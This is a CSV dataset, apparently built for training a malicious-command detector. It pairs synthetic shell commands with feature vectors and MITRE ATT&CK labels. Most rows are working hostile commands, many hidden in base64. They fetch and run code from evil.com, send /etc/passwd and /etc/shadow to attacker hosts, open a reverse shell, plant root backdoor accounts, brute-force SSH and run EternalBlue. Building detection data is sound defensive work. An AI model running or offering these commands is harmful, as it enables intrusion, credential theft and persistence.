command,features,label,source
echo 'bmNyYWNrIC1wIDIyIC0tdXNlciByb290IC1QIHBhc3MubHN0IDEwLjAuMC4x' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
salt '*' cmd.run 'curl http://evil.com | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1072_Software_Deployment_Tools'],synthetic
echo 'c3NoIC1EIDEwODAgLWYgLU4gdXNlckBqdW1wLmhvc3Q=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1090_Proxy', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZmZtcGVnIC1mIGFsc2EgLWkgZGVmYXVsdCAtdCA2MCAvdG1wL21pYy5tcDM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1123_Audio_Capture', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'b3BlbnNzbCBlbmMgLWFlcy0yNTYtY2JjIC1pbiAvZXRjL3NoYWRvdyAtb3V0IC90bXAvZW5jX3NoYWRvdyAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1132_Data_Encoding', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
msiexec /quiet /i http://evil.com/payload.msi && history -c,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1218_System_Binary_Proxy_Execution', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
mv malware.sh .legit.sh,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1036_Masquerading'],synthetic
wmic useraccount list full && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1047_Windows_Management_Instrumentation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' ; sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""find /home -name '*.kdbx' 2>/dev/null && chmod +x /tmp/payload""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 1]","['T1005_Data_from_Local_System', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time secretsdump.py -just-dc-user Administrator domain/user:pass@DC,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"time python3 -c ""import base64; print(base64.b64encode(open('/etc/passwd','rb').read()).decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1132_Data_Encoding'],synthetic
cat /tmp/encoded | xxd -r -p,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
locate  wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
sox -t alsa default /tmp/recording.wav trim 0 120 | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 1]","['T1123_Audio_Capture', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bGRhcHNlYXJjaCAteCAtYiAnZGM9ZG9tYWluLGRjPWNvbScgJyhvYmplY3RDbGFzcz1wZXJzb24pJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2dldCAtLXBvc3QtZmlsZT0vZXRjL3Bhc3N3ZCBodHRwOi8vYXR0YWNrZXIuY29tL3JlY2VpdmUgJiYgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
top -bn1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
find ~/.mozilla -name '*.xpi' -exec cp {} /tmp/ \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1176_Browser_Extensions'],synthetic
sudo for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.56, 0, 0]",['T1110_Brute_Force'],synthetic
sudo echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""python3 -c ""import ctypes; ctypes.CDLL(None).system('/tmp/shell')""""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1055_Process_Injection'],synthetic
git clone https://github.com/user/repo.git,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjAuMC45OSIsNDQ0NCk7IC4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nohup df -h &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time ./frpc -c frpc.ini && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1219_Remote_Access_Software', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -name '*.docx' -exec cp {} /tmp/collected/ \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1119_Automated_Collection'],synthetic
sudo crontab -e,"[0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1053_Scheduled_Task'],synthetic
find / -name 'wallet.dat' 2>/dev/null | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1005_Data_from_Local_System', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/enc_shadow && > /dev/null 2>&1,"[0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1132_Data_Encoding', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'ZmluZCAvcm9vdCAtbmFtZSAnKi5rZXknIC1leGVjIGNwIHt9IC90bXAvIFw7' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1005_Data_from_Local_System', 'T1027_Obfuscated_Files_or_Information']",synthetic
find  /home  -name  '.env'  2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'bmJ0c2NhbiAxOTIuMTY4LjEuMC8yNA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time ifconfig -a | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHRyYWNlIGluamVjdCAkKHBncmVwIGJhc2gpIC90bXAvc2hlbGxjb2Rl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1055_Process_Injection', 'T1027_Obfuscated_Files_or_Information']",synthetic
time cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time find / -name '*.pem' -exec cp {} /tmp/loot \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1074_Data_Staged'],synthetic
find ~/.mozilla -name '*.xpi' -exec cp {} /tmp/ \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1176_Browser_Extensions'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
hping3  --icmp  --data  1000  10.0.0.99,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1095_Non_Application_Layer_Protocol'],synthetic
echo 'ZWNobyAnKi81ICogKiAqICogY3VybCBodHRwOi8vYzIuY29tL2JlYWNvbicgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
time rsync -av /etc/ /tmp/etc_backup/ | echo done,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1074_Data_Staged', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
arecord -d 60 -f cd /tmp/audio.wav,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1123_Audio_Capture'],synthetic
New-ItemProperty  -Path  'HKLM:\...'  -Name  Persist  -Value  'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""du -sh /var/log""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo  'ZWNobyAnY29tcHJvbWlzZWQgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2V0Yy9zdWRvZXJz'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo 'ZmluZCAvaG9tZSAtbmFtZSAnLmVudicgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJiA7IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
ps  aux  |  grep  nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
"bash -c ""sox -t alsa default /tmp/recording.wav trim 0 120 && > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.56, 1, 0]","['T1123_Audio_Capture', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
time su -s /bin/bash www-data && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"sudo python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())"" ; echo done","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./frpc -c frpc.ini,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1219_Remote_Access_Software'],synthetic
sudo msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run',"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"bash -c 'python3 -c import os;os.system(""id"")'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
hydra  -l  admin  -P  /usr/share/wordlists/rockyou.txt  ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
nohup wmic useraccount list &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
echo 'bmV0IGFjY291bnRzIC9kb21haW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1201_Password_Policy_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
journalctl  -u  ssh  --since  today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
tar -czf /tmp/data.tar.gz /home/*/Documents,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['T1074_Data_Staged'],synthetic
proxychains nmap -sV 10.0.0.1 && history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1090_Proxy', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
time openssl enc -aes-256-cbc -d -in /tmp/enc_payload -out /tmp/payload | > /dev/null 2>&1,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.52, 1, 0]","['T1140_Deobfuscate_Decode', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""python3 -c ""import base64; exec(base64.b64decode('aW1wb3J0IG9z'))""""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
find /home -name '*.kdbx' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1005_Data_from_Local_System'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd21pYyAvbm9kZToxMC4wLjAuNSAvdXNlcjphZG1pbiBwcm9jZXNzIGNhbGwgY3JlYXRlICdjbWQuZXhlJyA7IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1047_Windows_Management_Instrumentation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRlIDsgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo sox -t alsa default /tmp/recording.wav trim 0 120,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1123_Audio_Capture'],synthetic
time scrot -u /tmp/cap.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1113_Screen_Capture'],synthetic
locate wp-config.php | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cGluZyAtYyAxIC1wIDQxNDI0MzQ0NDUgYXR0YWNrZXIuY29tIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1095_Non_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
gnome-screenshot -f /tmp/grab.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1113_Screen_Capture'],synthetic
nmap -A -T4 192.168.1.0/24 ; sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ffmpeg -f alsa -i default -t 60 /tmp/mic.mp3 &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1123_Audio_Capture'],synthetic
